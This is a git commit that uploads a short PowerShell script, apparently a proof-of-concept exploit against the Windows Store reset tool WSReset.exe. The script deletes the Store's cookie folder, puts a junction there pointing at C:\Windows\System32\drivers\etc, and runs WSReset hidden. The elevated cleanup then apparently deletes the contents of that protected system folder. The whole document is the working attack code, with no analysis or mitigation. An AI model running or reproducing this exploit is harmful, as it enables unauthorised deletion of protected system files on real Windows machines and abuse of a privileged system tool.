2258ad8f03737c5f05ba2befbd14b37795229b31
Daniel Gebert <65860107+Daniel-itsec@users.noreply.github.com>
2020-07-14 16:16:23 +0200

    Add files via upload

---
+++ FolderReset.ps1
@@ -0,0 +1,20 @@
+﻿function clearfolder($foldername){
+# get store cookies folder
+$storefolder = ($env:LOCALAPPDATA + "\Packages\Microsoft.WindowsStore_8wekyb3d8bbwe\AC\INetCookies\")
+# delete folder
+Remove-Item $storefolder -Recurse -Force -ErrorAction SilentlyContinue
+# create junction
+New-Item -ItemType Junction -Path $storefolder -Target $foldername -ErrorAction SilentlyContinue >$null 2>&1
+# start wreset
+Start-Process "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
+# close winstore app
+while($true){
+if ((Get-Process 'WinStore.App' -ErrorAction SilentlyContinue).WorkingSet -gt 1) {
+Stop-Process -Name 'WinStore.App'
+Write-Host 'Finished'
+exit
+}
+}
+}
+
+clearfolder -foldername 'C:\Windows\System32\drivers\etc'
